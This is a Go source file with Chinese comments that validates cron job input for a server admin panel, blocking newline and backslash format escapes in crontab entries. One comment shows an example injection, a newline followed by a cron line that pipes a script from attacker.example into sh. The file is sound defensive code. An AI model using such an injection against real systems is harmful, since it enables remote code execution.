package cron

import (
	"errors"
	"fmt"
	"strings"
)

// ============================================================================
// 输入校验（阶段五 5.2）
// ============================================================================
//
// 校验分两层，**顺序不可调换**：
//
//	① 表达式：严格白名单解析（expr.go）。表达式是唯一会被 cron
//	   守护进程按行内语法直接解释的部分，注入面全在这里，
//	   所以它的容错必须是零。
//	② 命令：**允许完整 shell 命令**（这是需求，面板不做命令白名单），
//	   但拒绝任何会让「一行任务变成两行」的字符。
//
// ########## 命令字段唯一的真注入面是换行 ##########
//
// crontab 是按行的格式。允许用户写 `rm -rf /tmp/x`（哪怕危险）
// 与允许他写换行，是完全不同量级的事情：
//
//	命令 = "echo ok\n* * * * * curl attacker.example/x.sh|sh"
//
// 前者的危险是**用户自己的意图**（面板是 root 运维工具，
// 用户本来就能在终端敲这条命令）；后者是**格式逃逸**——
// 他会往 crontab 里多塞一条任务、甚至一行 MAILTO=，
// 而这既不是他被告知的行为，也绕过了面板的任务模型
// （列表里只有一条，实际跑两条）。
//
// 因此这里的纪律是：**内容不限，结构必限**。
// 同理拒绝行尾孤立反斜杠：它会让 crontab 把下一行当续行吃掉。

// 长度上限：crontab 单行长度本身受 LINE_BUFFER 限制（常见 1000 字节），
// 超出后 cron 会静默忽略该行——「保存成功但永远不执行」是最难排查的
// 故障，因此在入口就拒绝，而不是把问题留给守护进程。
const (
	// MaxCommandLen 是命令原文的字节上限。
	MaxCommandLen = 900
	// MaxCommentLen 是备注的字节上限（备注会进标记注释与审计）。
	MaxCommentLen = 200
	// MaxExprLen 是表达式的字节上限。
	MaxExprLen = 200
)

// ErrConfirmRequired 表示删除操作缺少二次确认（接口层映射为 428）。
var ErrConfirmRequired = errors.New("cron: 删除任务必须带 confirm=true")

// ErrJobNotFound 表示按 id 找不到任务（接口层映射为 404）。
var ErrJobNotFound = errors.New("cron: 任务不存在")

// ErrJobInvalid 表示任务不可通过面板编辑（如表达式本就不合法）。
type ErrJobInvalid struct {
	ID     string
	Reason string
}

func (e *ErrJobInvalid) Error() string {
	return fmt.Sprintf("cron: 任务 %s 不能被面板接管：%s", e.ID, e.Reason)
}

// ErrEditConflict 表示任务在编辑期间已被外部改动（乐观并发）。
//
// 面板之外还有 `crontab -e`、系统脚本、ansible —— 它们随时可能重写
// 同一个 crontab。若不加检查，用户的编辑会**静默覆盖**那些改动，
// 或者更糟：把标记注释写到一个已经挪了位置/已被删除的行上。
// 因此 Update/Delete 都接受提交时的 id 集合做前置断言。
type ErrEditConflict struct {
	ID string
}

func (e *ErrEditConflict) Error() string {
	return fmt.Sprintf("cron: 任务 %s 已被外部修改（crontab 内容与面板预期不一致）"+
		"，请刷新列表后重试，**不要重复提交**", e.ID)
}

// JobInput 是新建/编辑任务的请求体。
type JobInput struct {
	// Expression 是 cron 表达式（5 段式或 @ 别名）。
	Expression string
	// Command 是完整 shell 命令。
	Command string
	// Comment 是备注。
	Comment string
	// ExpectedJobIDs 是客户端提交的「我基于哪一版做的编辑」（可空）。
	// 非空时 Manager 会校验当前 crontab 的任务 id 集合与之完全一致。
	ExpectedJobIDs []string
}

// ValidationError 是一条字段级校验错误，供接口层返回 400 + 字段名。
type ValidationError struct {
	Field  string
	Reason string
}

func (e *ValidationError) Error() string {
	return fmt.Sprintf("cron: 字段 %s 非法：%s", e.Field, e.Reason)
}

// ValidateJobInput 校验任务输入，返回已解析的表达式（供计算下次执行时间）。
//
// 逐字段收集错误再一次性返回不划算（一次只报第一个即可，
// 前端表单也是逐字段提示），但**字段顺序固定**：
// 表达式 → 命令 → 备注，与表单从上到下一致。
func ValidateJobInput(in JobInput) (*ExprSpec, error) {
	expr := strings.TrimSpace(in.Expression)
	if len(expr) > MaxExprLen {
		return nil, &ValidationError{Field: "expression",
			Reason: fmt.Sprintf("长度 %d 超过上限 %d", len(expr), MaxExprLen)}
	}
	spec, err := ValidateExpr(expr)
	if err != nil {
		return nil, &ValidationError{Field: "expression",
			Reason: strings.TrimPrefix(err.Error(), "cron: ")}
	}

	if err := ValidateCommand(in.Command); err != nil {
		return nil, err
	}

	comment := strings.TrimSpace(in.Comment)
	if err := ValidateComment(comment); err != nil {
		return nil, err
	}
	return spec, nil
}

// ValidateComment 校验备注。
//
// 备注会写进标记注释行（`# lipanel:<id> <备注>`），因此同样受
// 「一行一条」的结构约束：换行必须拒绝。
// `#` 本身允许——备注是标记行的**尾部**内容，正则按「id 之后的全部」
// 取回，中间的 # 不会截断解析（这里不做静默替换：
// 悄悄改写用户输入比拒绝更难解释）。
func ValidateComment(comment string) error {
	if len(comment) > MaxCommentLen {
		return &ValidationError{Field: "comment",
			Reason: fmt.Sprintf("长度 %d 超过上限 %d", len(comment), MaxCommentLen)}
	}
	for _, r := range comment {
		if r == '\n' || r == '\r' || r == '\t' || r == 0 || r < 0x20 || r == 0x7f {
			return &ValidationError{Field: "comment",
				Reason: "含有换行或控制字符（备注会被写成 crontab 里的一行注释）"}
		}
	}
	return nil
}

// ValidateCommand 校验命令原文。
//
// 明确**不做**的事情：命令黑白名单、危险字符（; && | $() 反引号）过滤。
// 计划要求「允许用户写完整 shell 命令」，且在 UI 与审计里如实呈现；
// 面板本身有终端功能，任何命令过滤都既拦不住真想绕过的人，
// 又会让正常运维写法（`find ... -exec`、重定向）无法使用。
// 安全性靠的是：登录鉴权 + 权限判定 + 二次确认 + 完整审计留痕。
func ValidateCommand(cmd string) error {
	trimmed := cmd
	if strings.TrimSpace(trimmed) == "" {
		return &ValidationError{Field: "command", Reason: "不能为空"}
	}
	if len(trimmed) > MaxCommandLen {
		return &ValidationError{Field: "command",
			Reason: fmt.Sprintf("长度 %d 超过上限 %d 字节（crontab 行过长会被 cron 静默忽略）",
				len(trimmed), MaxCommandLen)}
	}
	// 结构类字符：换行/回车会凭空多出一行任务；NUL 会让下游截断；
	// 其它 C0 控制字符与 DEL 无法安全写进 crontab 或注释。
	for _, r := range trimmed {
		switch {
		case r == '\n' || r == '\r':
			return &ValidationError{Field: "command",
				Reason: "含有换行符——会被 crontab 解析成两条任务（这是格式逃逸，不允许）。" +
					"需要执行多条命令请写成 `cmd1 && cmd2` 或用分号分隔在一行内"}
		case r == 0:
			return &ValidationError{Field: "command", Reason: "含有 NUL 字符"}
		case r < 0x20 || r == 0x7f:
			return &ValidationError{Field: "command", Reason: "含有控制字符，无法安全写入 crontab"}
		}
	}
	// 制表符：合法但会让 crontab 行变丑且易被 sed 类脚本误处理，
	// 直接要求换成空格的成本远低于将来排查「看起来一样却行为不同」。
	if strings.ContainsRune(trimmed, '\t') {
		return &ValidationError{Field: "command", Reason: "含有制表符，请改用空格"}
	}
	// 行尾奇数个反斜杠 = 续行符，会把 crontab 的下一行吞进本条命令。
	if n := trailingBackslashes(trimmed); n%2 == 1 {
		return &ValidationError{Field: "command",
			Reason: "以反斜杠结尾：crontab 会把下一行当作本命令的续行吞掉，请去掉结尾的反斜杠"}
	}
	return nil
}

func trailingBackslashes(s string) int {
	n := 0
	for i := len(s) - 1; i >= 0 && s[i] == '\\'; i-- {
		n++
	}
	return n
}

// ValidateJobID 校验任务 id 形态（面板 id 或派生 id）。
//
// 这是所有按 id 操作的**第一道**关卡：id 会被拼进包装脚本/日志文件名，
// 因此形态校验必须在任何路径拼接之前（见 parse.go 的 scriptPathFor）。
func ValidateJobID(id string) error {
	id = strings.TrimSpace(id)
	if managedIDRe.MatchString(id) || derivedIDRe.MatchString(id) {
		return nil
	}
	return &ValidationError{Field: "id", Reason: "不是合法的任务 ID"}
}
